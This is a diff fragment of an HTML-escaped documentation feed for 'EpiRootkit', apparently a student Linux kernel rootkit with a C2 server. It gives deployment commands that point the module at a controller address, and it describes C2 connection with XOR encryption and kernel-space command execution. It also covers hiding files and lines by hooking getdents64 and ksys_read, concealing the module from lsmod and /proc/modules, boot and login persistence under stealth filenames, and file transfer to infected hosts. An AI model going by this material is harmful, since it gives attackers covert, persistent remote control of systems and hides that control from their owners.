+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>rootkit/core/config.h&lt;/code>:&lt;/p></description></item><item><title>Build &amp; Deployment</title><link>/docs/05-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/deployment/</guid><description>&lt;h2 id="requirements">Requirements &lt;a href="#requirements" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="system">System &lt;a href="#system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
 &lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS&lt;/li>
 &lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-* (check with &lt;code>uname -r&lt;/code>)&lt;/li>
 &lt;/ul>
@@ -1594,8 +1434,7 @@ sudo insmod epirootkit.ko address=192.168.200.11 port=4444
 sudo insmod epirootkit.ko&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="self-cleanup-features">Self-Cleanup Features &lt;a href="#self-cleanup-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The deployment script includes stealth capabilities:&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h1 id="connection--authentication">Connection &amp;amp; Authentication &lt;a href="#connection--authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>How EpiRootkit connects to the C2 server and handles authentication with &lt;strong>domain support&lt;/strong> and &lt;strong>XOR encryption&lt;/strong>.&lt;/p>
-&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
+&lt;h2 id="self-cleanup-features">Self-Cleanup Features &lt;a href="#self-cleanup-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The deployment script includes stealth capabilities:&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/05-epirootkit/connection-authentication/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/connection-authentication/</guid><description>&lt;h2 id="connection-process">Connection Process &lt;a href="#connection-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>When the rootkit loads, it automatically:&lt;/p>
 &lt;ol>
 &lt;li>&lt;strong>Starts connection thread&lt;/strong> (&lt;code>epirootkit_conn&lt;/code>)&lt;/li>
 &lt;li>&lt;strong>Resolves domain&lt;/strong> (if address is domain name) - see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/dns-resolution/'>&lt;p>FEATURES&lt;/p>&lt;strong>DNS Resolution&lt;/strong>&lt;br>Kernel-space DNS client for domain-based C2 communication&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/dns-resolution/">DNS Resolution&lt;/a>&lt;/li>
@@ -1631,8 +1470,7 @@ sudo insmod epirootkit.ko&lt;/code>
 #define C2_SERVER_PORT 4444&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="runtime-parameters">Runtime Parameters &lt;a href="#runtime-parameters" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Override config.h settings during deployment:&lt;/p></description></item><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h1 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Execute system commands in kernel space using &lt;code>call_usermodehelper&lt;/code> with output capture.&lt;/p>
-&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;h3 id="runtime-parameters">Runtime Parameters &lt;a href="#runtime-parameters" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Override config.h settings during deployment:&lt;/p></description></item><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -1672,8 +1510,7 @@ sudo insmod epirootkit.ko&lt;/code>
 }&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Uses shell execution with output redirection to temporary files for result capture.&lt;/p></description></item><item><title>DNS Resolution</title><link>/docs/05-epirootkit/features/dns-resolution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/dns-resolution/</guid><description>&lt;h1 id="dns-resolution">DNS Resolution &lt;a href="#dns-resolution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Kernel-space DNS client for resolving domain names to IP addresses, enabling domain-based C2 communication.&lt;/p>
-&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;p>Uses shell execution with output redirection to temporary files for result capture.&lt;/p></description></item><item><title>DNS Resolution</title><link>/docs/05-epirootkit/features/dns-resolution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/dns-resolution/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -1711,8 +1548,7 @@ int kernel_dns_resolve(const char *hostname, u32 *ip_addr)
 }&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>Builds standard DNS queries and parses A record responses using Google DNS (8.8.8.8).&lt;/p></description></item><item><title>Encryption</title><link>/docs/05-epirootkit/features/encryption/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/encryption/</guid><description>&lt;h1 id="encryption">Encryption &lt;a href="#encryption" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>XOR-based encryption for C2 communication using a hardcoded 32-byte key.&lt;/p>
-&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;p>Builds standard DNS queries and parses A record responses using Google DNS (8.8.8.8).&lt;/p></description></item><item><title>Encryption</title><link>/docs/05-epirootkit/features/encryption/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/encryption/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -1829,8 +1665,7 @@ static void update_hide_state(int mode)
  warning
  &lt;/span>&lt;/div>
  
- &lt;div class="w-100">&lt;p>The &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/line-hiding/'>&lt;p>FEATURES&lt;/p>&lt;strong>Line Hiding&lt;/strong>&lt;br>Hide rootkit lines from file contents using syscall interception&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/line-hiding/">Line Hiding&lt;/a> also hides the module from &lt;code>/proc/modules&lt;/code> so to test module visibility with lsmod, you must disable line hiding.&lt;/p></description></item><item><title>File Hiding</title><link>/docs/05-epirootkit/features/file-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-hiding/</guid><description>&lt;h1 id="file-hiding">File Hiding &lt;a href="#file-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide files and directories with specific prefixes from directory listings by intercepting &lt;code>getdents64&lt;/code> syscall.&lt;/p>
-&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+ &lt;div class="w-100">&lt;p>The &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/line-hiding/'>&lt;p>FEATURES&lt;/p>&lt;strong>Line Hiding&lt;/strong>&lt;br>Hide rootkit lines from file contents using syscall interception&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/line-hiding/">Line Hiding&lt;/a> also hides the module from &lt;code>/proc/modules&lt;/code> so to test module visibility with lsmod, you must disable line hiding.&lt;/p></description></item><item><title>File Hiding</title><link>/docs/05-epirootkit/features/file-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-hiding/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -1889,8 +1724,8 @@ ls /tmp/
 # Output: normal_file.txt&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="control">Control &lt;a href="#control" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="webui">WebUI &lt;a href="#webui" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Toggle via &lt;strong>&lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/04-web-ui/features/panels/configuration-panel/'>&lt;p>UI PANELS&lt;/p></description></item><item><title>Persistence</title><link>/docs/05-epirootkit/features/persistence/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/persistence/</guid><description>&lt;h1 id="persistence">Persistence &lt;a href="#persistence" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Two mechanisms for automatic module loading: &lt;strong>modules-load.d&lt;/strong> (boot) and &lt;strong>shell profile&lt;/strong> (login).&lt;/p>
-&lt;h2 id="modules-loadd-method">modules-load.d Method &lt;a href="#modules-loadd-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Creates two files:&lt;/p>
+&lt;h2 id="control">Control &lt;a href="#control" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="webui">WebUI &lt;a href="#webui" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Toggle via &lt;strong>&lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/04-web-ui/features/panels/configuration-panel/'>&lt;p>UI PANELS&lt;/p></description></item><item><title>Persistence</title><link>/docs/05-epirootkit/features/persistence/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/persistence/</guid><description>&lt;h2 id="modules-loadd-method">modules-load.d Method &lt;a href="#modules-loadd-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Modules are&lt;/p>
+&lt;p>Creates two files:&lt;/p>
 &lt;p>&lt;strong>&lt;code>/etc/modules-load.d/jules_est_bo_system.conf&lt;/code>&lt;/strong>:&lt;/p>
 
 
@@ -2044,8 +1879,7 @@ lsmod | grep epirootkit&lt;/code>
 &lt;li>&lt;strong>modprobe.d&lt;/strong>: Uses &lt;code>jules_est_bo_&lt;/code> prefix for stealth consistency&lt;/li>
 &lt;li>&lt;strong>profile.d&lt;/strong>: Uses &lt;code>jules_est_bo_&lt;/code> prefix for stealth&lt;/li>
 &lt;/ul>
-&lt;p>&lt;strong>Reliable, standards-compliant persistence with consistent stealth naming.&lt;/strong>&lt;/p></description></item><item><title>Line Hiding</title><link>/docs/05-epirootkit/features/line-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/line-hiding/</guid><description>&lt;h1 id="line-hiding">Line Hiding &lt;a href="#line-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide lines containing rootkit patterns from file contents by intercepting read syscalls.&lt;/p>
-&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;p>&lt;strong>Reliable, standards-compliant persistence with consistent stealth naming.&lt;/strong>&lt;/p></description></item><item><title>Line Hiding</title><link>/docs/05-epirootkit/features/line-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/line-hiding/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -2078,7 +1912,35 @@ lsmod | grep epirootkit&lt;/code>
  &lt;/div>
 &lt;p>Hooks &lt;code>ksys_read&lt;/code> syscall and filters lines containing rootkit patterns from target files.&lt;/p>
 &lt;h2 id="module-hiding-complement">Module Hiding Complement &lt;a href="#module-hiding-complement" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Module Hiding&lt;/strong>: Removes module from kernel list (affects &lt;code>lsmod&lt;/code>)&lt;br>
-&lt;strong>Line Hiding&lt;/strong>: Filters &lt;code>/proc/modules&lt;/code> content when read&lt;/p></description></item><item><title>File Transfer</title><link>/docs/05-epirootkit/features/file-transfer/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="file-transfer">File Transfer &lt;a href="#file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Bidirectional file transfer between C2 server and infected systems using base64 encoding.&lt;/p>
+&lt;strong>Line Hiding&lt;/strong>: Filters &lt;code>/proc/modules&lt;/code> content when read&lt;/p>
+&lt;p>Combined, they provide comprehensive module stealth.&lt;/p>
+&lt;h2 id="testing">Testing &lt;a href="#testing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="258fb2b" class="language-bash ">
+ &lt;code># Test with provided file
+sudo cp test_line_hiding_epirootkit.txt /etc/cron.d/test_epirootkit
+cat /etc/cron.d/test_epirootkit
+# Result: 24 lines → ~9 lines (rootkit patterns filtered)
+
+# Test module information
+cat /proc/modules | grep epirootkit
+# Output: (nothing when line hiding active)&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="control">Control &lt;a href="#control" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="webui">WebUI &lt;a href="#webui" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Toggle via &lt;strong>&lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/04-web-ui/features/panels/configuration-panel/'>&lt;p>UI PANELS&lt;/p></description></item><item><title>File Transfer</title><link>/docs/05-epirootkit/features/file-transfer/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="file-transfer">File Transfer &lt;a href="#file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Bidirectional file transfer between C2 server and infected systems using base64 encoding.&lt;/p>
 &lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="upload-to-target">Upload to Target &lt;a href="#upload-to-target" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
